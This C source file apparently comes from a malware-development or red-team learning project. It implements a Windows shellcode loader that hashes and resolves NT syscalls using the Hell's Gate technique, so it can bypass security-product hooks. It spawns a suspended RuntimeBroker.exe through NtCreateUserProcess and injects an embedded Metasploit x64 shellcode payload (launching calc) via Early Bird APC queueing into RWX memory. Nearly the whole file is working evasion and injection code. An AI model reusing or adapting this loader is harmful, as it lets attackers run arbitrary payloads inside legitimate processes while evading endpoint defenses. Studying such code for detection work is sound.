#include <stdio.h>
#include <windows.h>

#include "../include/structs.h"

// Comment to perform injection, uncomment to hash syscalls
// printf("#define %s%s 0x%p \n", "NtAllocateVirtualMemory", "_djb2", (DWORD64)djb2("NtAllocateVirtualMemory"));
// #define HASH

// place syscall hashes here
#define RtlCreateProcessParametersEx_djb2 0xB890B468413D99A5
#define NtCreateUserProcess_djb2 0x23BC5E404E89B303
#define NtAllocateVirtualMemory_djb2 0x8F0AF4EE1C81F5F6
#define NtWriteVirtualMemory_djb2 0xAD8CE1C3645CCA7C
#define NtProtectVirtualMemory_djb2 0xA938D0D01566E832
#define NtQueueApcThread_djb2 0x018C5D767E696022
#define NtAllocateVirtualMemory_djb2 0x8F0AF4EE1C81F5F6
#define NtAlertResumeThread_djb2 0x725F8C9B3729F1B2
#define NtFreeVirtualMemory_djb2 0xC0DA36C236161593
#define NtClose_djb2 0x4856DC2BEF5031E7


DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0xD34DB33FDEADBEEF; // Old value: 0x7734773477347734
    INT c;

    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

// Rtl Init Unicode String
VOID _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

    if ((UsStruct->Buffer = (PWSTR)Buffer)) {

        unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
        if (Length > 0xfffc)
            Length = 0xfffc;

        UsStruct->Length = Length;
        UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
    }

    else UsStruct->Length = UsStruct->MaximumLength = 0;
}

// Define VX Tables
typedef struct _VX_TABLE_ENTRY{
    PVOID       pAddress;
    DWORD64     dwHash;
    WORD        wSysCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

typedef struct _VX_TABLE{
    VX_TABLE_ENTRY RtlCreateProcessParametersEx;
    VX_TABLE_ENTRY NtCreateUserProcess;
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtQueueApcThread;
    VX_TABLE_ENTRY NtAlertResumeThread;
    VX_TABLE_ENTRY NtFreeVirtualMemory;
    VX_TABLE_ENTRY NtClose;
} VX_TABLE, *PVX_TABLE;

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsword(0x16);
#endif
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    // Get DOS Header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER) pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // Get NT Headers
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS) ((PBYTE) pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // Get EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE) pModuleBase +
                                                         pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pvxTableEntry){
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinals = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for(WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++){
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinals[cx]];

        if(djb2(pczFunctionName) == pvxTableEntry->dwHash){
            pvxTableEntry->pAddress = pFunctionAddress;

            // Deal with hooks if function is hooked
            WORD cw = 0;
            while(TRUE){
                // check if syscall, in this case we are too far
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                // check if ret, in this case we are also probably too far
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                // First OPCODES:
                //      MOV R10, RCX
                //      MOV RCX, <syscall>
                if(*((PBYTE)pFunctionAddress + cw) == 0x4c
                   && *((PBYTE)pFunctionAddress + cw + 1) == 0x8b
                   && *((PBYTE)pFunctionAddress + cw + 2) == 0xd1
                   && *((PBYTE)pFunctionAddress + cw + 3) == 0xb8
                   && *((PBYTE)pFunctionAddress + cw + 6) == 0x00
                   && *((PBYTE)pFunctionAddress + cw + 7) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + cw + 5);
                    BYTE low = *((PBYTE)pFunctionAddress + cw + 4);
                    pvxTableEntry->wSysCall = (high << 8) | low;
                    break;
                }

                cw++;
            }

        }
    }

    return TRUE;
}

// Prototype for RtlCreateProcessParametersEx
// Will eventually change this call to use Hell's Gate as well once i figure out how
//\
https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntrtl.h#L2722

typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(

        PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
        PUNICODE_STRING					ImagePathName,
        PUNICODE_STRING					DllPath,
        PUNICODE_STRING					CurrentDirectory,
        PUNICODE_STRING					CommandLine,
        PVOID							Environment,
        PUNICODE_STRING					WindowTitle,
        PUNICODE_STRING					DesktopInfo,
        PUNICODE_STRING					ShellInfo,
        PUNICODE_STRING					RuntimeData,
        ULONG							Flags

);

// HellGate function prototypes
extern VOID HellsGate(WORD wSystemCall);
extern int HellDescent();

// x64 calc metasploit shellcode
unsigned char Payload[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};


#define TARGET_PROCESS		L"\\??\\C:\\Windows\\System32\\RuntimeBroker.exe"
#define PROCESS_PARMS		L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"
#define PROCESS_PATH		L"C:\\Windows\\System32"

BOOL CreateSuspendedProc(IN PVX_TABLE pTable, IN PWSTR szTargetProcessName, IN PWSTR szTargetProcessParameters, IN PWSTR szTargetProcessPath, OUT PHANDLE hProcess, OUT PHANDLE hThread){
    NTSTATUS                        status                          = 0;
    UNICODE_STRING                  UsNtImagePath                   = { 0 },
                                    UsCommandLine                   = { 0 },
                                    UsCurrentDirectory              = { 0 };
    PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters            = NULL;

    PPS_ATTRIBUTE_LIST              pAttributeList                  = (PPS_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
    if(!pAttributeList)
        return FALSE;

    // Init Unicode strings
    _RtlInitUnicodeString(&UsNtImagePath, szTargetProcessName);
    _RtlInitUnicodeString(&UsCommandLine, szTargetProcessParameters);
    _RtlInitUnicodeString(&UsCurrentDirectory, szTargetProcessPath);

    // Call RtlCreateProcessParametersEx to init a PRTL_USER_PROCESS_PARAMETERS struct
    /*HellsGate(pTable->RtlCreateProcessParametersEx.wSysCall);
    if((status = HellDescent(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)) != 0){
        printf("[!] RtlCreateProcessParametersEx FAILED with error : 0x%0.8lX \n", status);
        goto _CleanUp;
    }*/
    fnRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle("NTDLL"), "RtlCreateProcessParametersEx");
    if(RtlCreateProcessParametersEx == NULL){
        printf("[!] Failed to resolve RtlCreateProcessParametersEx \n");
        goto _CleanUp;
    }

    if((status = RtlCreateProcessParametersEx(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)) != 0){
        printf("[!] RtlCreateProcessParametersEx FAILED with error : 0x%0.8lX \n", status);
        goto _CleanUp;
    }

    // Settup attribute list
    pAttributeList->TotalLength                 = sizeof(PS_ATTRIBUTE_LIST);

    pAttributeList->Attributes[0].Attribute     = PS_ATTRIBUTE_IMAGE_NAME;
    pAttributeList->Attributes[0].Size          = UsNtImagePath.Length;
    pAttributeList->Attributes[0].Value         = (ULONG_PTR)UsNtImagePath.Buffer;

    PS_CREATE_INFO          psCreateInfo = {
            .Size   = sizeof(PS_CREATE_INFO),
            .State  = PsCreateInitialState
    };

    // Create Process
    HellsGate(pTable->NtCreateUserProcess.wSysCall);
    if((status = HellDescent(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, CREATE_SUSPENDED, NULL, UppProcessParameters, &psCreateInfo, pAttributeList)) != 0){
        printf("[!] NtCreateUserProcess FAILED with error : 0x%0.8lX \n", status);
        goto _CleanUp;
    }

_CleanUp:
    HeapFree(GetProcessHeap(), 0, pAttributeList);
    if(*hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;

}

BOOL EarlyBird(PVX_TABLE pTable, IN HANDLE hProcess, IN HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize){

    NTSTATUS status             = 0;
    PVOID pBaseAddress          = NULL;
    SIZE_T sSize                = sPayloadSize;
    DWORD dwNumBytesWritten     = 0;
    DWORD dwOldProtect          = 0;
    ULONG uSuspendCount         = 0;

    /*STARTUPINFOA si              = { 0 };
    PROCESS_INFORMATION pi      = { 0 };

    RtlSecureZeroMemory(&si, sizeof(STARTUPINFOA));
    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    si.cb = sizeof(STARTUPINFOA);

    // Create Process
    if(!CreateProcessA(NULL, TARGET_PROCESS, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)){
        printf("[!] CreateProcessA FAILED with error : %ld \n", GetLastError());
        return FALSE;
    }*/

    // Allocate Memory
    HellsGate(pTable->NtAllocateVirtualMemory.wSysCall);
    if((status = HellDescent(hProcess, &pBaseAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0){
        printf("[!] NtAllocateVirtualMemory FAILED with error : 0x%0.8lX \n", status);
        return FALSE;
    }
    printf("[+] Allocated %zu bytes at 0x%p \n", sSize, pBaseAddress);

    // Copy payload
    HellsGate(pTable->NtWriteVirtualMemory.wSysCall);
    if((status = HellDescent(hProcess, pBaseAddress, pPayload, sPayloadSize, &dwNumBytesWritten)) != 0){
        printf("[!] NtWriteVirtualMemory FAILED with error : 0x%0.8lX \n", status);
        return FALSE;
    }
    printf("[+] Wrote %lu of %zu bytes \n", dwNumBytesWritten, sPayloadSize);

    // Change Memory Protection
    sSize = sPayloadSize;
    HellsGate(pTable->NtProtectVirtualMemory.wSysCall);
    if((status = HellDescent(hProcess, &pBaseAddress, &sSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) != 0){
        printf("[!] NtProtectVirtualMemory FAILED with error : 0x%0.8lX \n", status);
        return FALSE;
    }
    printf("[+] Changed Memory Protection... \n");

    // Queue Thread
    HellsGate(pTable->NtQueueApcThread.wSysCall);
    if((status = HellDescent(hThread, pBaseAddress, NULL, NULL, NULL)) != 0){
        printf("[!] NtQueueApcThread FAILED with error : 0x%0.8lX \n", status);
        return FALSE;
    }
    printf("[+] Payload Queued for execution ...\n");

    // Resume Thread
    HellsGate(pTable->NtAlertResumeThread.wSysCall);
    if((status = HellDescent(hThread, &uSuspendCount)) != 0){
        printf("[!] NtAlertResumeThread FAILED with error : 0x%0.8lX \n", status);
        return FALSE;
    }



    printf("[+] Cleaning Up ... \n");
    // Close Open Handles
    HellsGate(pTable->NtClose.wSysCall);
    if((status = HellDescent(hProcess)) != 0)
        printf("[!] NtClose(pi.hProcess) FAILED with error : 0x%0.8lX \n", status);

    if((status = HellDescent(hThread)) != 0)
        printf("[!] NtClose(pi.hThread) FAILED with error : 0x%0.8lX \n", status);

    return TRUE;
}

int main(){

#ifdef HASH
    printf("#define %s%s 0x%p \n", "RtlCreateProcessParametersEx", "_djb2", (DWORD64)djb2("RtlCreateProcessParametersEx"));
    printf("#define %s%s 0x%p \n", "NtCreateUserProcess", "_djb2", (DWORD64)djb2("NtCreateUserProcess"));
    printf("#define %s%s 0x%p \n", "NtAllocateVirtualMemory", "_djb2", (DWORD64)djb2("NtAllocateVirtualMemory"));
    printf("#define %s%s 0x%p \n", "NtWriteVirtualMemory", "_djb2", (DWORD64)djb2("NtWriteVirtualMemory"));
    printf("#define %s%s 0x%p \n", "NtProtectVirtualMemory", "_djb2", (DWORD64)djb2("NtProtectVirtualMemory"));
    printf("#define %s%s 0x%p \n", "NtQueueApcThread", "_djb2", (DWORD64)djb2("NtQueueApcThread"));
    printf("#define %s%s 0x%p \n", "NtAllocateVirtualMemory", "_djb2", (DWORD64)djb2("NtAllocateVirtualMemory"));
    printf("#define %s%s 0x%p \n", "NtAlertResumeThread", "_djb2", (DWORD64)djb2("NtAlertResumeThread"));
    printf("#define %s%s 0x%p \n", "NtFreeVirtualMemory", "_djb2", (DWORD64)djb2("NtFreeVirtualMemory"));
    printf("#define %s%s 0x%p \n", "NtClose", "_djb2", (DWORD64)djb2("NtClose"));

    return 0;
#endif

    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
        return 0x1;

    // Get NTDLL module
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // Get the EAT of NTDLL
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x01;

//--------------------------------------------------------------------------
    // Initializing the 'Table' structure ...

    VX_TABLE Table = { 0 };
    Table.RtlCreateProcessParametersEx.dwHash = RtlCreateProcessParametersEx_djb2;
    /*if(!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.RtlCreateProcessParametersEx))
        return 0x1;*/

    Table.NtCreateUserProcess.dwHash = NtCreateUserProcess_djb2;
    if(!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateUserProcess))
        return 0x1;

    Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
        return 0x1;

    Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
        return 0x1;

    Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
        return 0x1;

    Table.NtQueueApcThread.dwHash = NtQueueApcThread_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtQueueApcThread))
        return 0x1;

    Table.NtAlertResumeThread.dwHash = NtAlertResumeThread_djb2;
    if(!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAlertResumeThread))
        return 0x1;

    Table.NtFreeVirtualMemory.dwHash = NtFreeVirtualMemory_djb2;
    if(!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtFreeVirtualMemory))
        return 0x1;

    Table.NtClose.dwHash = NtClose_djb2;
    if(!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtClose))
        return 0x1;


    HANDLE  hProcess        = NULL,
            hThread         = NULL;

    if(!CreateSuspendedProc(&Table, TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, &hProcess, &hThread))
        return -1;

    if(!EarlyBird(&Table, hProcess, hThread, Payload, sizeof(Payload)))
        return -1;

    return 0;
}